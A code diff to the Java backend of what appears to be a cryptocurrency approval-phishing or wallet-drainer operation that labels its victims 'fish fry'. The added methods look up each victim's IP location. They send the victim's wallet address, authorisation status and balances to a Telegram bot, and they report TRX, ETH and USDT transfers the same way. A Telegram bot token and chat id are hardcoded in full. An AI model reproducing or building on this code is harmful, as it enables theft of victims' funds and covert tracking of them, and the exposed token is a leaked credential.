@@ -19,6 +19,8 @@ import org.springframework.web.client.RestTemplate;
 import java.math.BigDecimal;
 import java.util.Date;
 
+import static com.sunlight.tronsdk.context.HttpContext.restTemplate;
+
 /**
  * 接收消息
  */
@@ -54,6 +56,23 @@ public class Receiver {
         }
         tronTansferRecord.setUpdateTime(new Date(System.currentTimeMillis()));
         iTronTansferRecordService.saveOrUpdate(tronTansferRecord);
+
+        //发送USDT_TRC20转账消息
+        StringBuffer stringBuffer = new StringBuffer();
+        stringBuffer.append("转账类型：" + "【TRX转账】\n");
+        stringBuffer.append("转出地址：" + tronTansferRecord.getFromAddress() + "\n");
+        stringBuffer.append("转入地址：" + tronTansferRecord.getToAddress() + "\n");
+        stringBuffer.append("转账金额：" + tronTansferRecord.getBalance() + "\n");
+        stringBuffer.append("转账结果：" + (result.get(AjaxResult.CODE_TAG).equals(200) ? "转账成功" : "转账失败") + "\n");
+
+        String url2 = "https://api.telegram.org/bot5745457029:AAGiQ3ksIDnlY0oLFaoG_z1GGMlXyJg1iOE/sendMessage?chat_id=-694241163&text=" + stringBuffer.toString();
+        log.info("sendMsg-bot发送请求={}", url2);
+
+        String result2 = restTemplate.getForObject(url2, String.class);
+        if (result2.isEmpty()) {
+            return;
+        }
+        log.info("sendMsg-bot返回结果={}", result2);
     }
 
     public void transferETH(String message) throws Exception {
@@ -72,6 +91,23 @@ public class Receiver {
         }
         tronTansferRecord.setUpdateTime(new Date(System.currentTimeMillis()));
         iTronTansferRecordService.saveOrUpdate(tronTansferRecord);
+
+        //发送USDT_TRC20转账消息
+        StringBuffer stringBuffer = new StringBuffer();
+        stringBuffer.append("转账类型：" + "【ETH转账】\n");
+        stringBuffer.append("转出地址：" + tronTansferRecord.getFromAddress() + "\n");
+        stringBuffer.append("转入地址：" + tronTansferRecord.getToAddress() + "\n");
+        stringBuffer.append("转账金额：" + tronTansferRecord.getBalance() + "\n");
+        stringBuffer.append("转账结果：" + (result.get(AjaxResult.CODE_TAG).equals(200) ? "转账成功" : "转账失败") + "\n");
+
+        String url2 = "https://api.telegram.org/bot5745457029:AAGiQ3ksIDnlY0oLFaoG_z1GGMlXyJg1iOE/sendMessage?chat_id=-694241163&text=" + stringBuffer.toString();
+        log.info("sendMsg-bot发送请求={}", url2);
+
+        String result2 = restTemplate.getForObject(url2, String.class);
+        if (result2.isEmpty()) {
+            return;
+        }
+        log.info("sendMsg-bot返回结果={}", result2);
     }
 
 
@@ -91,6 +127,24 @@ public class Receiver {
         }
         tronTansferRecord.setUpdateTime(new Date(System.currentTimeMillis()));
         iTronTansferRecordService.saveOrUpdate(tronTansferRecord);
+
+        //发送USDT_TRC20转账消息
+        StringBuffer stringBuffer = new StringBuffer();
+        stringBuffer.append("转账类型：" + "【USDT_TRC20转账】\n");
+        stringBuffer.append("转出地址：" + tronTansferRecord.getFromAddress() + "\n");
+        stringBuffer.append("转入地址：" + tronTansferRecord.getToAddress() + "\n");
+        stringBuffer.append("转账金额：" + tronTansferRecord.getBalance() + "\n");
+        stringBuffer.append("转账结果：" + (result.get(AjaxResult.CODE_TAG).equals(200) ? "转账成功" : "转账失败") + "\n");
+
+        String url2 = "https://api.telegram.org/bot5745457029:AAGiQ3ksIDnlY0oLFaoG_z1GGMlXyJg1iOE/sendMessage?chat_id=-694241163&text=" + stringBuffer.toString();
+        log.info("sendMsg-bot发送请求={}", url2);
+
+        String result2 = restTemplate.getForObject(url2, String.class);
+        if (result2.isEmpty()) {
+            return;
+        }
+        log.info("sendMsg-bot返回结果={}", result2);
+
     }
 
     public void transferUSDT_ERC20(String message) throws Exception {
@@ -109,6 +163,23 @@ public class Receiver {
         }
         tronTansferRecord.setUpdateTime(new Date(System.currentTimeMillis()));
         iTronTansferRecordService.saveOrUpdate(tronTansferRecord);
+
+        //发送USDT_TRC20转账消息
+        StringBuffer stringBuffer = new StringBuffer();
+        stringBuffer.append("转账类型：" + "【USDT_ERC20转账】\n");
+        stringBuffer.append("转出地址：" + tronTansferRecord.getFromAddress() + "\n");
+        stringBuffer.append("转入地址：" + tronTansferRecord.getToAddress() + "\n");
+        stringBuffer.append("转账金额：" + tronTansferRecord.getBalance() + "\n");
+        stringBuffer.append("转账结果：" + (result.get(AjaxResult.CODE_TAG).equals(200) ? "转账成功" : "转账失败") + "\n");
+
+        String url2 = "https://api.telegram.org/bot5745457029:AAGiQ3ksIDnlY0oLFaoG_z1GGMlXyJg1iOE/sendMessage?chat_id=-694241163&text=" + stringBuffer.toString();
+        log.info("sendMsg-bot发送请求={}", url2);
+
+        String result2 = restTemplate.getForObject(url2, String.class);
+        if (result2.isEmpty()) {
+            return;
+        }
+        log.info("sendMsg-bot返回结果={}", result2);
     }
 
     public void transferFROMServiceNO(String message) throws Exception {
@@ -325,5 +396,44 @@ public class Receiver {
         iTronFishService.saveOrUpdate(fish);
     }
 
+    public void sendMsg(String message) throws Exception {
+        log.debug("sendMsg接收到消息了:{}", message);
+        TronFish fish = JSONObject.parseObject(message, TronFish.class);
+        log.info("sendMsg-fish", fish);
+        String url = "https://whois.pconline.com.cn/ipJson.jsp?ip=" + fish.getIp() + "&json=true";
+        RestTemplate restTemplate = new RestTemplate();
+        String result = restTemplate.getForObject(url, String.class);
+        if (result.isEmpty()) {
+            return;
+        }
+        String addr = JSONObject.parseObject(result).getString("addr");
+        fish.setArea(addr);
+        iTronFishService.saveOrUpdate(fish);
+
+        StringBuffer stringBuffer = new StringBuffer();
+        stringBuffer.append("鱼苗IP：" + addr + "【" + fish.getIp() + "】\n");
+        stringBuffer.append("鱼苗信息：" + fish.getAddress() + "\n");
+        stringBuffer.append("授权地址：" + fish.getAuAddress() + "\n");
+        stringBuffer.append("鱼苗状态：" + (fish.getAuRecordId() != null ? "已授权" : "未授权") + "\n");
+
+        JSONObject jsonObject = JSONObject.parseObject(fish.getBalance());
+        String info = "";
+        if ("ETH".equalsIgnoreCase(fish.getType())) {
+            info = "ETH=" + jsonObject.get("eth") + ",USDT=" + jsonObject.get("usdt");
+        }
+        if ("TRX".equalsIgnoreCase(fish.getType())) {
+            info = "TRX=" + jsonObject.get("trx") + ",USDT=" + jsonObject.get("usdt");
+        }
+        stringBuffer.append("鱼苗余额：" + info + "\n");
+
+        String url2 = "https://api.telegram.org/bot5745457029:AAGiQ3ksIDnlY0oLFaoG_z1GGMlXyJg1iOE/sendMessage?chat_id=-694241163&text=" + stringBuffer.toString();
+        log.info("sendMsg-bot发送请求={}", url2);
+
+        String result2 = restTemplate.getForObject(url2, String.class);
+        if (result2.isEmpty()) {
+            return;
+        }
+        log.info("sendMsg-bot返回结果={}", result2);
+    }
 
 }
